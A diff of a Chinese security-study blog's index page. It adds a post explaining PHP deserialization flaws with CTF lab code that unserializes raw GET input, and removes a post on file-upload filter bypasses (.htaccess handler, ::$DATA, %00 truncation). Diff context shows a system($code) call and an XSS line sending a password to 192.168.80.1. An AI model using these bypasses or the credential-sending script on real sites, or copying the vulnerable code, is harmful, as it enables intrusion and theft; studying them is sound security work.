@@ -64,6 +64,74 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-PHP反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2021-11-26T11:06:00.000Z" itemprop="datePublished">2021-11-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">PHP反序列化漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h4><p>概念：序列化就是将对象转换成字符串，反序列化相反，数据的格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象<br>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。<br>serialize()        //将一个对象转换成一个字符串–序列化<br>unserialize()   //将字符串还原成一个对象–反序列化</p>
+<h4 id="有类与无类"><a href="#有类与无类" class="headerlink" title="有类与无类"></a>有类与无类</h4><h5 id="1、有类-class"><a href="#1、有类-class" class="headerlink" title="1、有类  class"></a>1、有类  class</h5><p>​     触发魔术方法<br>​    __construct()<br>​    __destruct()<br>​    __wakeup()<br>​    __toString()<br>​    ……</p>
+<h5 id="2、无类-不具有魔术方法"><a href="#2、无类-不具有魔术方法" class="headerlink" title="2、无类  不具有魔术方法"></a>2、无类  不具有魔术方法</h5><?php
+class user{
+    public $name='yucedu';
+    public $age=18;
+}
+$a = new user();
+$b = serialize($a);
+echo $b;
+
+?>
+
+<h4 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h4><p>O:4:”user”:2:{s:3:”age”;i:18;s:4:”name”;s:3:”yucedu”;}<br>O代表对象；4代表对象名长度；2代表2个成员变量；</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>1、真实应用   java环境<br>2、各种CTF比赛</p>
+<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>1、SQL注入<br>2、代码执行<br>3、目录遍历<br>4、……</p>
+<p>触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：<br>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a><br>__construct()//创建对象时触发<br>__destruct() //对象被销毁时触发<br>__call() //在对象上下文中调用不可访问的方法时触发<br>__callStatic() //在静态上下文中调用不可访问的方法时触发<br>__get() //用于从不可访问的属性读取数据<br>__set() //用于将数据写入不可访问的属性<br>__isset() //在不可访问的属性上调用 isset()或 empty()触发<br>__unset() //在不可访问的属性上使用 unset()时触发<br>__invoke() //当脚本尝试将对象调用为函数时触发</p>
+<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p> PHP反序列化无类本地测试<br>PHP反序列化有类魔术方法本地测试<br> 网鼎杯-AreUSerialz-有类魔术方法触发<br>    =   赋值<br>    ==  判断是否相等<br>    ===  全等，类型和数值都要一样</p>
+<?php
+class FileHandler{
+public $op=' 2';
+public $filename="flag.php";//文件开头调用的是 flag.php
+public $content="yucedu";
+}
+$flag = new FileHandler();
+$flag1 = serialize($flag);
+echo $flag1;
+?>
+
+<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/challenge">https://www.ctfhub.com/#/challenge</a>   ctf网鼎杯反序列化题目<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a>    PHP反序列化基本知识</p>
+<p>测试代码：<br>&lt;?php<br>error_reporting(0);<br>include “flag.php”;<br>$KEY = “yucedu”;<br>$str = $<em>GET[‘str’];<br>if (unserialize($str) ===$KEY)<br>{<br> echo “$flag”;<br>}<br>show_source(__FILE_</em>);</p>
+<p>class ABC{<br> public $test;<br> function __construct(){<br> $test =1;<br> echo ‘调用了构造函数</br>‘;<br> }<br> function __destruct(){<br> echo ‘调用了析构函数</br>‘;<br> }<br> function __wakeup(){<br> echo ‘调用了苏醒函数</br>‘;<br> }<br>}<br>echo ‘创建对象 a</br>‘;<br>$a = new ABC;<br>echo ‘序列化<br>‘;<br>$a_ser=serialize($a);<br>echo ‘反序列化</br>‘;<br>$a_unser = unserialize($a_ser);<br>echo ‘GoodBye’;<br>?&gt;</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="ckwgaav540007govj71zj1wol" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-逻辑越权漏洞-验证码和token安全及找回机制" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/" class="article-date">
@@ -99,7 +167,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/" data-id="ckw8yh26w0019jovj782wf8nc" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/" data-id="ckwgaav61001agovjafo7czx4" class="article-share-link">Share</a>
       
       
     </footer>
@@ -148,7 +216,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/" data-id="ckw8yh281001bjovjf8mpennb" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/" data-id="ckwgaav61001bgovj4448f9ig" class="article-share-link">Share</a>
       
       
     </footer>
@@ -202,7 +270,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/" data-id="ckw8yh26t0014jovj5uy708fk" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/" data-id="ckwgaav5v0015govjdpcnapna" class="article-share-link">Share</a>
       
       
     </footer>
@@ -259,7 +327,7 @@ echo system($code);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckw8yh2620005jovj0ch3hrv5" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckwgaav520004govjc8fbgm4u" class="article-share-link">Share</a>
       
       
     </footer>
@@ -324,7 +392,7 @@ curl_close($ch);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" data-id="ckw8yh25p0000jovjdfx45j1n" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" data-id="ckwgaav4s0000govjcc9cappn" class="article-share-link">Share</a>
       
       
     </footer>
@@ -372,7 +440,7 @@ curl_close($ch);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckw8yh26j000rjovj1xx9c6zj" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckwgaav5l000sgovj5l815ax4" class="article-share-link">Share</a>
       
       
     </footer>
@@ -425,7 +493,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="ckw8yh26i000qjovj86k05abv" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="ckwgaav5l000rgovj3jdz00bx" class="article-share-link">Share</a>
       
       
     </footer>
@@ -469,7 +537,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="ckw8yh26r0010jovjeo5zfzz1" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="ckwgaav5t0011govje86r9n0p" class="article-share-link">Share</a>
       
       
     </footer>
@@ -514,60 +582,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/" data-id="ckw8yh26r0011jovjbbz7alge" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-文件上传漏洞的后端绕过方法" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" class="article-date">
-  <time datetime="2021-10-16T11:21:06.000Z" itemprop="datePublished">2021-10-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/">文件上传漏洞的后端绕过方法</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="文件上传之后端黑白名单绕过"><a href="#文件上传之后端黑白名单绕过" class="headerlink" title="文件上传之后端黑白名单绕过"></a>文件上传之后端黑白名单绕过</h4><p>文件上传常见验证：<br>后缀名：黑名单、白名单<br>文件类型：MIME信息<br>文件头：内容头信息</p>
-<p>黑名单：明确不能上传的后缀<br>php，jsp，asp等</p>
-<p>白名单：明确能够上传的后缀<br>jpg，png，gif等等</p>
-<p>塒NG：png的文件头<br>xFFxD8：jpg的文件头<br>GIF89a：gif的文件头</p>
-<h4 id="文件类型MIME绕过"><a href="#文件类型MIME绕过" class="headerlink" title="文件类型MIME绕过"></a>文件类型MIME绕过</h4><p>数据包中的Content-Type就是MIME，通过格式猜测哪种类型的MIME</p>
-<h4 id="文件头信息绕过"><a href="#文件头信息绕过" class="headerlink" title="文件头信息绕过"></a>文件头信息绕过</h4><h4 id="简要上传代码分析解释"><a href="#简要上传代码分析解释" class="headerlink" title="简要上传代码分析解释"></a>简要上传代码分析解释</h4><h5 id="FILES函数"><a href="#FILES函数" class="headerlink" title="$_FILES函数"></a>$_FILES函数</h5><p>$_FILES[‘upfile’][‘name’]; //客户端上传文件的原名称，不包含路径<br>$_FILES[‘upfile’][‘type’]; //上传文件的MIME类型<br>$_FILES[‘upfile’][‘tmp_name’]; //已上传文件在服务器端保存的临时文件名，包含路径<br>$_FILES[‘upfile’][‘error’]; //上传文件出现的错误号，为一个整数<br>$_FILES[‘upfile’][‘size’]; //已上传文件的大小，单位为字节</p>
-<h5 id="trim-函数"><a href="#trim-函数" class="headerlink" title="trim() 函数"></a>trim() 函数</h5><p>移除字符串两侧的空白字符或其他预定义字符。<br>windiws系统下，对文件名中空格会被作为空处理，程序中的检验代码却不能自动删除空格。从而绕过黑名单。</p>
-<h5 id="deldot-file-name-函数"><a href="#deldot-file-name-函数" class="headerlink" title="deldot($file_name)函数"></a>deldot($file_name)函数</h5><p>去掉最后面得点<br>windows系统下，文件后缀名最后一个点会被自动去除，如果在上传中，没把末尾的.去除则会绕过。<br>例如 windows下新建一个1.php. 文件，会自动更正为1.php</p>
-<h5 id="php别名解析"><a href="#php别名解析" class="headerlink" title="php别名解析"></a>php别名解析</h5><p>php3、php5、phtml能解析成php文件<br>httpd.conf配置文件</p>
-<h5 id="htaccess文件解析"><a href="#htaccess文件解析" class="headerlink" title=".htaccess文件解析"></a>.htaccess文件解析</h5><p>1、只有apache具有此文件<br>2、 .htaccess文件(分布式配置文件)是针对每个目录改变配置的方法，就是把.htaccess文件放在一个目录中，其中里面的指令作用于此目录及其所有子目录。<br>3、上传漏洞指令：<br>&lt;FilesMatch “yucedu”&gt;<br>SetHandler application/x-httpd-php<br></FilesMatch> 作用是文件名包含yucedu的都会以php代码执行</p>
-<h5 id="user-ini文件解析"><a href="#user-ini文件解析" class="headerlink" title=".user.ini文件解析"></a>.user.ini文件解析</h5><p>1、服务器脚本语言为PHP<br>2、服务器使用CGI／FastCGI模式<br>3、上传目录下要有可执行的php文件<br>.user.ini作用:所有的php文件都自动包含jpg文件</p>
-<p>4、字符串::$DATA<br>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</p>
-<p>例如:”phpinfo.php::$DATA”Windows会自动去掉末尾的::$DATA变成”phpinfo.php”</p>
-<p>5、一次过滤与循环过滤(递归过滤)<br>作用：将字符串里的php替换为空</p>
-<p>一次过滤：<br>     1.php  –&gt; 1.[空]<br>     1.phphpp  –&gt;  1.php<br>循环过滤(递归过滤)<br>     1.php  –&gt; 1.[空]<br>     1.phphphpphppp  –&gt; 1.[空]</p>
-<p>6、%00截断与0x00截断<br>前提：php的版本要小于5.3.4并且魔术引号必须关闭<br>%00：主要针对地址上的截断<br>0x00截断：主要针对文件命名上的截断<br>     0x：16进制表示<br>     00：表示0<br>     0x00：就是代表16进制的0<br>有的函数在处理这个字符时，会当做结束符<br>%00 和 00 是一样的，只是在get提交时，经过url编码后，00就成了%00</p>
-<p>为什么post要进行编码，get就不用？<br>因为get提交方式会自动解码一次<br>然而post并不会</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" data-id="ckw8yh26t0013jovjf38k6ub7" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/" data-id="ckwgaav5u0012govj5jc37t80" class="article-share-link">Share</a>
       
       
     </footer>
@@ -613,6 +628,10 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       <ul>
         
           <li>
+            <a href="/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">PHP反序列化漏洞</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/">逻辑越权漏洞-验证码和token安全及找回机制</a>
           </li>
         
@@ -626,10 +645,6 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
         
           <li>
             <a href="/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">RCE代码命令执行漏洞</a>
-          </li>
-        
-          <li>
-            <a href="/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/">CSRF</a>
           </li>
         
       </ul>
